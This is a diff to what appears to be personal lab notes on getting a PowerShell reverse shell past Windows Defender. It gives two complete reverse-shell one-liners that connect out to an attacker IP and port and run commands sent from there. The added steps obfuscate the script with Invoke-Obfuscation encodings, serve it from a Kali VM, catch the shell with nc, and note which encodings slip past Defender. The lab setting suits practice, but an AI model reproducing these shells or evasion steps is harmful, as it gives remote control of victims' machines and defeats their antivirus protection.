@@ -20,6 +20,41 @@ On kali (attacker VM)
 
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-#(modify and save it)
+#(modify and save it at 'shell.ps1')
 
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+ - Invoke-Obfuscation> SET SCRIPTPATH /home/kali/shell.ps1
+ - Invoke-Obfuscation> ENCODING
+ - Invoke-Obfuscation/Encoding> ENCODING 5 (or 2,3,4,6,7 ...)
+ - Invoke-Obfuscation/Encoding> ENCODING 5
+       - BIJWGCIUGWIUVIUCVI@^*&%*&*(JCKBKJVBECY@GU89656747VJHV                         #(copy the all (long) result) in a note 'reverse-shell.ps1')   
+       
+       
+ On kali (attacker VM)
+ 
+  - serve
+       - Serving HTTP on 0.0.0.0 prot 80 ...
+       
+  - nc -nlvp 1234
+       - listening on [any] 1234 ...
+       
+  
+  On the Win (target VM)
+  
+   - Enable Win Defender
+   - Launch reverse-shell.ps1                                                   #(quiet Win Defender but no reverse shell with ENCODING 5. Try w/2 or 3,4,5,6,7....)
+   
+   
+   
+   
+   
+   
+       
+ 
+ 
+
+
+
+
